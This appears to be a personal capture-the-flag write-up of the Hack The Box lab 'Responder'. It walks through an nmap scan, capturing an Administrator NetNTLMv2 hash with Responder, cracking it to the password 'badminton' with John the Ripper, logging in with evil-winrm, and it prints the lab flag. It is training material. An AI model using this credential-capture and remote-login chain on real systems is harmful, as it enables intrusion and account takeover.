# HTB - [Responder]

**Difficulty:** Very Easy 
**Category:** [ Web/Smb ]   
**Date:** [23/03/2026]  
**Status:** ✅ Completed

---

## Summary

Responder is a very easy Windows machine that focuses on exploring a File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.
---


### Nmap Scan

```bash
nmap -p- --min-rate 1000 -sV [10.129.52.211]
```

**Results:**
```
[PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows]
```


## Exploitation

### Step 1 

First I see if was possible a vulnerability of LFI.
i use the responder for see the hash password.

```bash
[sudo python3 Responder.py -I tun0]    
```

### Step 2 

i see the hash and transformed it in a file called hash.txt 

```bash 
echo "Administrator::DESKTOPH3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D801
F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E0048004500380044
0049003400410053004300510004003400570049004E002D004E00480045003800440049003400410053004300
51002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F00430041
004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D801060004000200
000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F
356D47C324C6D6D16F0A001000000000000000000000000000000000000900200063006900660073002F003100
30002E00310030002E00310034002E00320035000000000000000000" > hash.txt
```

---

### After this I run john the ripper and use this command:
```bash
[john -w=/usr/share/wordlists/rockyou.txt hash.txt]
```    
### output
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-03-23 18:47) 4.347g/s 53426p/s 53426c/s 53426C/s 123456..hawkeye
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```


### i use for the first time the evil-winRM.

```bash
evil-winrm -i 10.129.52.211 -u administrator -p badminton
```

---

## Flag

```
HTB {ea81b7afddd03efaa0945333ed147fac}
```

---

## What I Learned

- use responder
- use john
- use evil-wniRM
- learn LFI vulnerability
---

